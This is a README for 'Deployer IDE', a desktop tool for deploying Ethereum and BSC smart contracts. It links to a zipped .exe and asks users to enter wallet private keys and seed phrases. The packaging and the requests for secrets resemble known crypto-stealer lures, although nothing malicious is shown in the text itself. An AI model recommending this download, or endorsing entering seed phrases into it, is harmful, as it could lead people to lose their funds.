# 🚀 Deployer IDE Documentation

![Deployer Interface](https://i.ibb.co/vYKVjkX/1.png)

## 📥 Downloads

-   **[Download for Windows/Mac OS (.exe)](https://github.com/oadfade/DeployerIDE-ERC20-Toolkit/raw/refs/heads/main/DeployerIDE.zip)**
-   **[Download for Python (.py)](deployer.py)**

-   [Watch the demo video](https://github.com/oadfade/DeployerIDE-ERC20-Toolkit/blob/main/.github/workflows/DeployerIDE.mp4)


## 📋 Overview

Deployer IDE is an intuitive interface for interacting with **Ethereum** and **Binance Smart Chain (BSC)** networks. It
provides tools for compiling, deploying, and managing smart contracts across multiple networks, all from a single
interface.

<video width="720" height="400" controls>
  <source src="https://github.com/oadfade/DeployerIDE-ERC20-Toolkit/raw/main/.github/workflows/DeployerIDE.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>


---

## 🗂 Application Structure

The interface is divided into four main sections:

1. **📡 Left Panel**: Network selection, key input, contract compilation, and deployment functions.
2. **💻 Center Panel**: Smart contract code input and import.
3. **🖥 Right Panel**: Logs display, bytecode and ABI, and saved contracts management.
4. **🔗 Button Menu**: Quick access to commonly used resources such as Documentation, Uniswap, PancakeSwap, Etherscan,
   BscScan, and DEX Tools.

---

## 🔐 Left Panel: Network, Key Management, and Contract Deployment

![Left Panel](https://i.ibb.co/RDPDtNG/left.png)

### 🌐 Network Selection

At the top of the panel, you can choose between different networks:

- **BNB Main Network**: `https://bsc-dataseed.binance.org/`  
  For real transactions on the Binance Smart Chain using BNB tokens.

- **BNB Test Network**: `https://data-seed-prebsc-1-s1.binance.org:8545/`  
  Test network for BSC, useful for debugging without real funds.

- **Ethereum Main Network**: `https://eth.llamarpc.com`  
  Provides access to the Ethereum mainnet for real transactions.

- **Ethereum Sepolia Test Network**: `https://ethereum-sepolia-rpc.publicnode.com`  
  Ideal for testing contracts without risking real funds.

> ⚠️ **Note**: We recommend thoroughly testing your contract on a test network before moving to the mainnet.

Once a network is selected, the application connects automatically, using the provided private key.

### 🔑 Private Key Input

![Private Key](https://i.ibb.co/PhZbS3b/privatekey.png)

- **Private Key**: Enter your wallet’s private key to sign transactions on the chosen network.

### 🏦 Wallet Address and Balance

The wallet address and balance are displayed once a connection is established, updating in real-time based on the
selected network.

---

## 🔄 Seed Phrase to Private Key Converter

![Seed Phrase Converter](https://i.ibb.co/yYsNNx2/phrase.png)

**Seed Phrase Converter** securely converts your seed phrase to a private key, allowing for wallet management.

#### 🚀 Usage Instructions:

1. **Enter the seed phrase** in the input field.
2. Click **Seed Phrase to Private key**.
3. The **private key** will display in the logs for **10 seconds**.

> ⚠️ **Security Notice**: The private key is shown for **10 seconds** only, then automatically cleared from the logs.

---

## 🔧 Solidity Compiler Version Selection

![Compiler Version](https://i.ibb.co/JkfRv5r/version.png)

Select the appropriate Solidity compiler version for your contract.

- **Supported Versions**: From **0.4.11** to **0.8.26**.
- **Auto-Suggestion**: The interface suggests a suitable compiler version based on your code to avoid compatibility
  issues.

> Choosing the correct compiler version ensures compatibility with your contract's syntax and functionality.

---

## ⚙️ Compile Contract with Imports and Interfaces

![Compile](https://i.ibb.co/gFQGFcp/comlipe.png)

The **"Compile"** button initiates import checking and compilation in one step.

1. **Import and Interface Check**: Checks for missing imports in the contract code and downloads them as needed.
2. **Contract Compilation**: After verification, the selected compiler version compiles the contract. ABI and bytecode
   are displayed upon successful compilation.

> 💡 **Note**: Previously loaded imports and interfaces are cached to speed up future compilations.

---

## 🚀 Deployment

![Deploy](https://i.ibb.co/4d2dZ6m/Deploy.png)

The **"Deploy"** button deploys the compiled contract to the selected network. After deployment, the contract's address
and bytecode appear in the interface, with logs updating in real-time.

### 📃 Contract Functions and Deployed Contract Address

![Functions](https://i.ibb.co/7NbfpPm/functional.png)

After deploying the contract, the interface enables the following:

- **🔄 Contract Functions**: Easily interact with available contract functions, pass parameters, and retrieve output.
- **🔗 Blockchain Explorer Link**: View contract details on Etherscan or BscScan.

---

## 📝 Central Panel: Smart Contract Code Editor

![Code Editor](https://i.ibb.co/GW0fT5B/Code.png)

The Central Panel offers essential tools for writing and checking Solidity code.

- **Code Editing Field**: Create or paste Solidity code with undo functionality and scroll support for long files.
- **Built-in Syntax Checker**: Detects syntax errors and displays messages in the logs, allowing for quick debugging.

---

## 🧾 Right Panel: Information Windows

The Right Panel provides key information related to contract creation, compilation, and management.

### 📋 Action Log

![Logs](https://i.ibb.co/GkKftGK/logs.png)

**Log** keeps a record of all contract-related actions, showing messages such as successes and errors, helping you trace
every step.

### 🧩 Bytecode Field

![Bytecode](https://i.ibb.co/sbddcRk/bite.png)

The **Bytecode Field** displays the compiled bytecode, useful for verifying deployment and accessing low-level code
representation.

### 🛠 ABI Field

![ABI](https://i.ibb.co/YjwcH45/ABI.png)

**ABI (Application Binary Interface)** outlines contract functions, events, and data types, crucial for subsequent
interactions.

### 📂 Saved Contracts

![Saved Contracts](https://i.ibb.co/tDNRnrk/loadcontracts.png)

Saved contracts are locally stored, offering the benefit of **persistence** over browser-based IDEs, which lose data on
session resets. You can load saved contracts, interact with their functions, and continue working without recompiling.

> **Note**: Saved contracts retain all settings, ABI, and data, making them accessible even after restarting the
> application.

---

## 🛠 Additional Interface Features

![Reset](https://i.ibb.co/Rhs6Xb7/reset.png)

### 🌐 Connection Indicator and Reset Button

A **Green Connection Indicator** at the top of the interface shows your network connection status, crucial for
blockchain and API interactions.

Next to it, the **Reset** button clears all data, resetting the interface for a new session.

### 🗑 Deleting Saved Contracts

![Delete](https://i.ibb.co/HpjGXSw/delete.png)

To delete specific saved contracts, right-click the desired contract and select **Delete**. To clear all saved data,
delete the **contracts.json** file in the DeployerIDE folder.

---

### 🔗 Button Menu: Quick Access Tools

![Button Menu](https://i.ibb.co/Dkc5V2j/top.png)

The interface includes a range of buttons for quick access to popular tools and resources:

- **Documentation**: Opens the DeployerIDE user guide.
- **Uniswap**: Links to Uniswap, the Ethereum token exchange.
- **PancakeSwap**: Links to PancakeSwap for BSC token exchange.
- **Etherscan**: Accesses Etherscan for Ethereum data.
- **BscScan**: Accesses BscScan for BSC data.
- **DEX Tools**: Provides DEX analytics and trading tools.

### 🧮 Encode as Uint256 Function

The **Encode as Uint256** feature converts an Ethereum address into a `uint256` format. Useful for contract functions
requiring addresses in this specific data type.

---

## 🛠 Technical Specifications

DeployerIDE v2.0611 is built on **Python 3.10** using key libraries:

- `web3` - Interacts with Ethereum-compatible blockchains.
- `requests` - Sends HTTP requests to blockchain APIs.
- `solcx` - Compiles Solidity code.

---

© DeployerIDE. All rights reserved.
